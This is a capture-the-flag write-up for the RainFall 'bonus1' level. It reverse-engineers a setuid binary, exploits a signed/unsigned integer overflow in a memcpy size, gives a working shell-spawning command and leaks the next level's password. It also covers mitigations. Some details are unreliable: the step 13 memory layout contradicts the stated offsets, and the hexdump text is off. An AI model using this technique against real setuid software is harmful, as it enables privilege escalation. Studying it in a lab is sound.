# Bonus1

## Initial Analysis

### 1. Examine the Binary
```bash
bonus1@RainFall:~$ ls -la
total 17
dr-xr-x---+ 1 bonus1 bonus1   80 Mar  6  2016 .
dr-x--x--x  1 root   root    340 Sep 23  2015 ..
-rw-r--r--  1 bonus1 bonus1  220 Apr  3  2012 .bash_logout
-rw-r--r--  1 bonus1 bonus1 3530 Sep 23  2015 .bashrc     
-rwsr-s---+ 1 bonus2 users  5043 Mar  6  2016 bonus1      
-rw-r--r--+ 1 bonus1 bonus1   65 Sep 23  2015 .pass       
-rw-r--r--  1 bonus1 bonus1  675 Apr  3  2012 .profile    

bonus1@RainFall:~$ file bonus1 
bonus1: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 bonus1: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x5af8fd13428afc6d05de1abfa9d7e7621df174c7, not stripped
```

**Key observations:**
- **setuid and setgid binary** (s flags in permissions)
- Owned by **bonus2** user
- When executed, runs with **bonus2 privileges**

### 2. Test Basic Execution Behavior
```bash
bonus1@RainFall:~$ ./bonus1 
Segmentation fault

bonus1@RainFall:~$ ./bonus1 bla
[no output - exits normally]

bonus1@RainFall:~$ ./bonus1 5 hello
[no output - exits normally]

bonus1@RainFall:~$ ltrace ./bonus1
__libc_start_main(0x8048424, 1, 0xbffff7f4, 0x80484b0, 0x8048520 <unfinished ...>
atoi(0, 0x8049764, 1, 0x80482fd, 0xb7fd13e4 <unfinished ...>
--- SIGSEGV (Segmentation fault) ---
+++ killed by SIGSEGV +++

bonus1@RainFall:~$ ltrace ./bonus1 42 42
__libc_start_main(0x8048424, 3, 0xbffff7d4, 0x80484b0, 0x8048520 <unfinished ...>
atoi(0xbffff904, 0x8049764, 3, 0x80482fd, 0xb7fd13e4) = 42
+++ exited (status 1) +++

bonus1@RainFall:~$ ltrace ./bonus1 leet
__libc_start_main(0x8048424, 2, 0xbffff7d4, 0x80484b0, 0x8048520 <unfinished ...>
atoi(0xbffff905, 0x8049764, 2, 0x80482fd, 0xb7fd13e4) = 0
memcpy(0xbffff704, NULL, 0) = 0xbffff704
+++ exited (status 0) +++
```

**Initial Pattern Discovery:**
- **No arguments**: Segmentation fault (tries to access argv[1] when NULL)
- **One argument**: Program exits silently without error
- **Two arguments**: Program exits silently without error
- **ltrace shows atoi()**: Suggests first argument is converted to integer, further analysis shows that the program exits before memcpy if any 

**Critical Insight**: The program expects at least one argument and calls atoi() on it. The silent exit suggests there might be conditions that aren't being met.

## Reverse Engineering - Understanding the Integer Logic

### 3. Function Analysis - Discovering the Control Flow
```bash
bonus1@RainFall:~$ gdb bonus1
(gdb) info functions
All defined functions:
Non-debugging symbols:
0x08048320  memcpy@plt      ← Memory copy function
0x08048330  __gmon_start__@plt
0x08048340  __libc_start_main@plt
0x08048350  execl@plt       ← Shell execution!
0x08048360  atoi@plt        ← String to integer conversion
0x08048424  main
```

**Function Discovery Analysis:**
- **atoi()**: Converts string to integer
- **memcpy()**: Memory copy function - potentially vulnerable
- **execl()**: Shell execution capability - this is our goal!
- **Single main() function**: All logic contained in main

### 4. Main Function Analysis - Understanding the Logic Flow
```bash
(gdb) disas main
Dump of assembler code for function main:
   0x08048424 <+0>:     push   %ebp
   0x08048425 <+1>:     mov    %esp,%ebp
   0x08048427 <+3>:     and    $0xfffffff0,%esp
   0x0804842a <+6>:     sub    $0x40,%esp        # 64 bytes local space

   # Convert argv[1] to integer
   0x0804842d <+9>:     mov    0xc(%ebp),%eax    # Load argv
   0x08048430 <+12>:    add    $0x4,%eax         # Point to argv[1]
   0x08048433 <+15>:    mov    (%eax),%eax       # Dereference argv[1]
   0x08048435 <+17>:    mov    %eax,(%esp)       # Push argv[1]
   0x08048438 <+20>:    call   0x8048360 <atoi@plt>  # atoi(argv[1])
   0x0804843d <+25>:    mov    %eax,0x3c(%esp)   # Store result at ESP+60

   # Check if result <= 9
   0x08048441 <+29>:    cmpl   $0x9,0x3c(%esp)   # Compare with 9
   0x08048446 <+34>:    jle    0x804844f <main+43>  # Jump if <= 9
   0x08048448 <+36>:    mov    $0x1,%eax         # Return 1 (failure)
   0x0804844d <+41>:    jmp    0x80484a3 <main+127>  # Exit
```

**Control Flow Discovery:**
- **argv[1] converted to integer**: Using atoi(), stored at ESP+60
- **Range validation**: Integer must be <= 9 to continue
- **Exit condition**: If > 9, program returns 1 and exits
- **Success path**: If <= 9, continues to next block

### 5. Memory Copy Operation Analysis
```bash
   # If nb <= 9, setup memcpy
   0x0804844f <+43>:    mov    0x3c(%esp),%eax   # Load nb
   0x08048453 <+47>:    lea    0x0(,%eax,4),%ecx # ECX = nb * 4
   0x0804845a <+54>:    mov    0xc(%ebp),%eax    # Load argv
   0x0804845d <+57>:    add    $0x8,%eax         # Point to argv[2]
   0x08048460 <+60>:    mov    (%eax),%eax       # Dereference argv[2]
   0x08048462 <+62>:    mov    %eax,%edx         # Source: argv[2]
   0x08048464 <+64>:    lea    0x14(%esp),%eax   # Destination: ESP+20
   0x08048468 <+68>:    mov    %ecx,0x8(%esp)    # Size: nb * 4
   0x0804846c <+72>:    mov    %edx,0x4(%esp)    # Source: argv[2]
   0x08048470 <+76>:    mov    %eax,(%esp)       # Dest: buffer
   0x08048473 <+79>:    call   0x8048320 <memcpy@plt>  # memcpy!
```

**Memory Copy Analysis:**
- **memcpy() call**: `memcpy(buffer, argv[2], nb * 4)`
- **Buffer location**: ESP+20 (stack buffer)
- **Copy size**: `nb * 4` where nb is from argv[1]
- **Source**: argv[2] (user-controlled string)

**Critical Limitation Discovery:**
Since nb must be <= 9, maximum copy size = 9 * 4 = 36 bytes

### 6. The Magic Value Check
```bash
   # Check for magic value
   0x08048478 <+84>:    cmpl   $0x574f4c46,0x3c(%esp)  # Compare nb with magic
   0x08048480 <+92>:    jne    0x804849e <main+122>    # Jump if not equal
   
   # Success: Execute shell
   0x08048482 <+94>:    movl   $0x0,0x8(%esp)          # NULL
   0x0804848a <+102>:   movl   $0x8048580,0x4(%esp)    # "-c"
   0x08048492 <+110>:   movl   $0x8048583,(%esp)       # "/bin/sh"
   0x08048499 <+117>:   call   0x8048350 <execl@plt>   # execl("/bin/sh", "-c", NULL)
```

**The Win Condition Discovery:**
```bash
(gdb) x/s 0x8048583
0x8048583:       "/bin/sh"
(gdb) x/s 0x8048580  
0x8048580:       "-c"
(gdb) print/x 0x574f4c46
$1 = 0x574f4c46
(gdb) print 0x574f4c46
$2 = 1464814662
```

**Magic Value Analysis:**
- **Target value**: 0x574f4c46 (1,464,814,662 in decimal)
- **ASCII representation**: "FLOW" in little-endian (0x46='F', 0x4c='L', 0x4f='O', 0x57='W')
- **Win condition**: If nb equals this magic value, execl() is called
- **Challenge**: How to get this large value when nb must be <= 9?

## Understanding the Integer Overflow Vulnerability

### 7. Stack Layout Analysis
```bash
(gdb) break *main+79
(gdb) run 5 hello
Breakpoint 1, 0x08048473 in main ()

(gdb) x/20wx $esp
0xbffff6d0:     0xbffff6e4      0xbffff8f8      0x00000014      0x00000000
0xbffff6e0:     0x00000000      0x00000000      0x00000000      0x00000000
0xbffff6f0:     0x00000000      0x00000000      0x00000000      0x00000000
0xbffff700:     0x00000000      0x00000000      0x00000000      0x00000005
#                                                               ↑ nb at ESP+60

# Buffer starts at ESP+20, nb stored at ESP+60
# Distance: 60 - 20 = 40 bytes
```

**Memory Layout Discovery:**
```
Stack Layout:
ESP+20: Buffer start (memcpy destination)
ESP+60: nb variable (magic value check target)
Distance: 40 bytes

Attack Strategy:
Need to copy 44 bytes total:
- 40 bytes to fill buffer (padding)
- 4 bytes to overwrite nb with magic value (0x574f4c46)
```

### 8. The Integer Overflow Insight
**The Problem:**
- Need nb <= 9 to pass validation
- Need nb * 4 = 44 to copy enough bytes
- 44 / 4 = 11, but 11 > 9 (fails validation)

**The Solution: Negative Integer Overflow!**
```bash
# Understanding signed vs unsigned conversion:
# atoi() returns signed int (can be negative)
# memcpy() expects size_t (unsigned int)
# Negative values become large positive when cast to unsigned!
```

### 9. Mathematical Calculation for Exploitation
```bash
# Goal: Find negative nb where:
# 1. nb <= 9 (passes validation)
# 2. (nb * 4) when cast to unsigned = 44

# Working with 32-bit signed integers:
# Range: -2,147,483,648 to 2,147,483,647

# We need: nb * 4 = 44 (in unsigned representation)
# Let's work backwards from a large negative number:

# Starting with minimum 32-bit signed int: -2,147,483,648
# Divide by 4: -536,870,912 (still way too negative)

# We need something that when multiplied by 4 gives us 44
# In modular arithmetic: (nb * 4) mod 2^32 = 44

# Finding the value:
# We want: nb * 4 ≡ 44 (mod 2^32)
# One solution: nb = (2^32 - 44) / 4 + some multiple of 2^30

# Let's try: nb = -2,147,483,637
# nb * 4 = -8,589,934,548
# In 64-bit: 0xFFFFFFFE 0000002C
# Truncated to 32-bit: 0x0000002C = 44 ✓

# Verification:
# nb = -2,147,483,637 <= 9 ✓
# (nb * 4) & 0xFFFFFFFF = 44 ✓
```

## Exploitation Implementation

### 10. Testing the Integer Overflow Theory
```bash
bonus1@RainFall:~$ gdb bonus1
(gdb) run -2147483637 hello

# Set breakpoint after memcpy to see the copy size
(gdb) break *main+79
(gdb) run -2147483637 $(python -c 'print "A"*50')
Breakpoint 1, 0x08048473 in main ()

(gdb) x/x $esp+8  # Check the size parameter passed to memcpy
0xbffff6d8:     0x0000002c    # 0x2c = 44 bytes!

(gdb) print -2147483637 * 4
$1 = -8589934548
(gdb) print/x -8589934548 & 0xffffffff
$2 = 0x2c    # Confirms: 44 bytes after unsigned conversion!
```

**Integer Overflow Confirmation:**
- **nb = -2147483637**: Passes <= 9 check ✓
- **nb * 4 = 44**: After unsigned conversion ✓
- **Can copy 44 bytes**: Enough to overwrite nb variable ✓

### 11. Crafting the Magic Value Payload
```bash
# Magic value: 0x574f4c46 ("FLOW")
# Need little-endian byte order for x86: \x46\x4c\x4f\x57

# Payload structure:
# [40 bytes padding] + [4 bytes magic value]

bonus1@RainFall:~$ python -c 'print "A" * 40 + "\x46\x4c\x4f\x57"' | xxd
00000000: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
00000010: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
00000020: 4141 4141 4141 4141 464c 4f57            AAAAAAAAFOW
# Total: 44 bytes (40 + 4)
```

### 12. Execute the Final Exploit
```bash
bonus1@RainFall:~$ ./bonus1 -2147483637 $(python -c 'print "A" * 40 + "\x46\x4c\x4f\x57"')
$ whoami
bonus2
$ cat /home/user/bonus2/.pass
579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
```

**Success!**
1. **Integer validation bypassed**: -2147483637 <= 9 ✓
2. **Overflow calculation**: -2147483637 * 4 = 44 bytes (after conversion) ✓
3. **Buffer overflow**: 44 bytes copied, overwriting nb variable ✓
4. **Magic value set**: nb = 0x574f4c46 ("FLOW") ✓
5. **Shell execution**: execl("/bin/sh", "-c", NULL) called ✓
6. **Privilege escalation**: Shell runs with bonus2 privileges ✓

### 13. Understanding the Execution Flow
```bash
# Step-by-step execution analysis:

1. argv[1] = "-2147483637"
   atoi() converts to signed int: -2147483637
   Validation: -2147483637 <= 9 ✓ (passes)

2. Size calculation: nb * 4 = -2147483637 * 4 = -8589934548
   Cast to size_t (unsigned): 0x0000002C = 44 bytes

3. memcpy(buffer, argv[2], 44)
   Copies 44 bytes from argv[2] to buffer at ESP+20

4. Memory layout after memcpy:
   ESP+20 to ESP+47: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" (40 A's)
   ESP+48 to ESP+51: Not overwritten (only 44 bytes copied)
   ESP+60 to ESP+63: 0x574f4c46 ("FLOW") ← nb variable overwritten!

5. Magic value check: nb == 0x574f4c46 ✓
   execl("/bin/sh", "-c", NULL) executed
```

## Educational Analysis - Integer Overflow Vulnerabilities

### 14. Understanding Signed/Unsigned Conversion Issues

**The Core Vulnerability:**
```c
// Vulnerable pattern (conceptual C code):
int nb = atoi(argv[1]);           // Signed integer
if (nb <= 9) {                   // Signed comparison
    memcpy(buffer, argv[2], nb * 4);  // Unsigned size_t parameter!
}
```

**Type Conversion Problem:**
- **atoi() returns signed int**: Can be negative
- **memcpy() expects size_t**: Unsigned type
- **Implicit conversion**: Negative values become large positive

**Integer Arithmetic Overflow:**
- **32-bit signed range**: -2,147,483,648 to 2,147,483,647
- **Multiplication overflow**: Results can exceed 32-bit range
- **Modular arithmetic**: Truncation to 32-bit creates unexpected values

### 15. Modern Protection Mechanisms

**Why This Attack Works:**
- **No integer overflow checking**: Arithmetic operations not validated
- **Type confusion**: Signed/unsigned conversion unchecked
- **Predictable memory layout**: Stack variables at fixed offsets
- **No bounds validation**: memcpy size not independently verified

**Modern Mitigations:**
- **Integer overflow detection**: Compiler flags like -ftrapv
- **Safe integer libraries**: Checked arithmetic operations
- **Static analysis**: Tools detecting signed/unsigned confusion
- **Runtime bounds checking**: AddressSanitizer, stack canaries
- **Size validation**: Independent verification of copy sizes

### 16. Secure Coding Practices

**What Went Wrong:**
```c
// Multiple issues in vulnerable code:
int nb = atoi(argv[1]);                    // 1. No input validation
if (nb <= 9) {                            // 2. Insufficient range check
    memcpy(buffer, argv[2], nb * 4);       // 3. No overflow checking
    if (nb == 0x574f4c46) {               // 4. Magic value dependency
        execl("/bin/sh", "-c", NULL);     // 5. Dangerous privilege escalation
    }
}
```

**Secure Alternatives:**
```c
// Better approach:
int nb = atoi(argv[1]);
if (nb < 0 || nb > 9) {                   // Check both bounds
    return 1;
}
size_t copy_size = (size_t)nb * 4;        // Explicit casting
if (copy_size > sizeof(buffer)) {         // Bounds checking
    return 1;
}
if (strlen(argv[2]) > copy_size) {        // Source length validation
    return 1;
}
memcpy(buffer, argv[2], copy_size);       // Safe copy
```

### 17. Attack Sophistication Analysis

**Unique Aspects:**
- **Mathematical exploitation**: Requires understanding of modular arithmetic
- **Type system abuse**: Exploits language-level type conversion
- **Validation bypass**: Uses arithmetic properties to circumvent checks
- **Precise calculation**: Exact mathematical relationship required

**Real-World Relevance:**
- **Common in C/C++**: Signed/unsigned confusion frequent
- **Cryptographic libraries**: Integer overflows in size calculations
- **Network protocols**: Length field manipulation
- **File format parsing**: Size validation bypass techniques

### 18. Integer Overflow Classes

**Different Integer Overflow Types:**
1. **Addition overflow**: a + b exceeds maximum value
2. **Multiplication overflow**: a * b exceeds maximum value (this case)
3. **Subtraction underflow**: a - b goes below minimum value
4. **Signed/unsigned confusion**: Type conversion changes value interpretation

**Exploitation Techniques:**
- **Wraparound arithmetic**: Use modular properties of fixed-width integers
- **Type confusion**: Exploit implicit conversions between signed/unsigned
- **Range validation bypass**: Find values that pass checks but behave unexpectedly
- **Memory allocation attacks**: Integer overflows in malloc() size calculations